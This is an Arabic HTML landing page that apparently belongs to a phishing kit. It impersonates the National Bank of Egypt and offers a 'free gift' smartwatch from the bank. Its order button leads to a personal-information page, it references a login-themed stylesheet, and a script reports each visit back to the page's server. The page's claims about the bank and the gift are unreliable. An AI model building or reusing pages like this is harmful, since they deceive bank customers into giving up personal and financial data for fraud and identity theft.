<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>البنك الأهلي - هدية مجانية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
    <style>
        /* Styles specific to index page that are not in login-theme.css */
        .flag-section { width: 100%; height: 230px; overflow: hidden; }
        .flag-section img { width: 100%; height: 100%; object-fit: cover; }
        .intro-section { text-align: center; padding: 25px 20px 15px 20px; background-color: #ffffff; border-bottom: 1px solid #eee; }
        .intro-subtitle { font-size: 15px; color: #0b6b4f; font-weight: bold; margin-bottom: 8px; }
        .intro-title { font-size: 24px; color: #1a1a1a; font-weight: 800; margin-bottom: 12px; line-height: 1.4; }
        .intro-desc { font-size: 15px; color: #555; line-height: 1.6; max-width: 700px; margin: 0 auto; }
        .watches-container { width: 100%; max-width: 420px; margin: 20px auto 30px auto; padding: 0 12px; display: flex; flex-direction: column; gap: 18px; }
        .watch-card { background: #fff; border-radius: 22px; padding: 0 0 18px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eee; overflow: hidden; }
        .watch-card img { width: 100%; height: 228px; object-fit: contain; padding: 16px; }
        .watch-gift { display: inline-flex; align-items: center; justify-content: center; font-size: 13px; margin: 10px; padding: 7px 13px; font-weight: 800; color: #07543f; background: #e8f4ef; border-radius: 999px; }
        .card-feature { display: flex; align-items: center; gap: 9px; margin: 0 14px 7px; padding: 8px 10px; text-align: right; font-size: 12px; color: #333; background: #f6faf8; border: 1px solid #e4f0eb; border-radius: 10px; }
        .card-feature svg { width: 20px; height: 20px; fill: #0b6b4f; }
        .order-btn { background: #0b6b4f; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin: 10px 14px; text-align: center; }
        @media (min-width: 700px) { .watches-container { max-width: 980px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px; } }
    </style>
</head>
<body>

<header class="site-header">
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
    </div>
    <div class="header-left">
        <a href="index_en.html" class="lang-switcher">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
            <span>English</span>
        </a>
    </div>
</header>

<div class="flag-section">
    <img src="banner_user.jpg" alt="البنك الأهلي">
</div>

<div class="intro-section">
    <div class="intro-subtitle">نبذة عن البنك الأهلي</div>
    <h1 class="intro-title">أهلاً بك في البنك الأهلي</h1>
    <p class="intro-desc">حضور قوي في السوق المصرفي المصري منذ عام 1977.</p>
</div>

<div class="watches-container">
    <div class="watch-card">
        <img src="https://i.ibb.co/5WhR438R/IMG-20260811-WA0009.jpg" alt="ساعة 1">
        <div class="watch-gift">هدية مجانيه مقدمه من البنك الأهلي</div>
        <div class="card-feature"><svg viewBox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg><span>تدعم جميع اللغات</span></div>
        <a href="personal_info.html" class="order-btn">اطلب ساعتك الآن</a>
    </div>
    <!-- More watches can be added here -->
</div>

<script>
    fetch("/track_visit", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: "track_visit", page: "index" })
    }).catch(error => console.error('Error tracking visit:', error));
</script>

</body>
</html>
